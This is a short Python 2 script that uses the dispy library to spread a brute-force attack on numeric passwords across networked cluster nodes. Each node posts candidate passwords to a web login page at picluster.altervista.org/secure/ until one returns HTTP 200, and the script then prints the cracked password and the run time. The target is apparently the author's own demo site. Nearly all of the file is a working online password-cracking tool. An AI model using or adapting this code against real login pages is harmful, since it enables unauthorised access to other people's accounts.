import dispy, time, sys

# argv: [jobs multiplier][password length]
ip_nodes = open("nodes.txt","r").read().split(",")
ip_nodes[len(ip_nodes)-1] = ip_nodes[len(ip_nodes)-1].rstrip("\n")

def crackPassword (startPsw, stopPsw):
    import requests
    for i in xrange(startPsw, stopPsw):
        if requests.post("http://picluster.altervista.org/secure/", data = {"pwd":i}).status_code == 200:
            return i
    return None

def run (numJobs, pswLength):
    cluster = dispy.JobCluster(crackPassword,nodes = ip_nodes)

    unit = int((10**pswLength)/numJobs)+1
    jobs = []

    for i in xrange(0,numJobs):
        print i*unit,"-",(i+1)*unit
        jobs.append(cluster.submit(i*unit,(i+1)*unit))

    cluster.wait()
    cluster.stats()

    for j in jobs:
        if j.result is not None:
            return j.result

if __name__ == "__main__":

    tStart = time.time()

    crackedPassword = run(int(sys.argv[1]), int(sys.argv[2]))

    tEnd = time.time() - tStart

    print "Computation real time: " + str(tEnd)[:5] + " sec\n"

    print "Cracked password: " + str(crackedPassword)
    print "http://picluster.altervista.org/secure/\n"
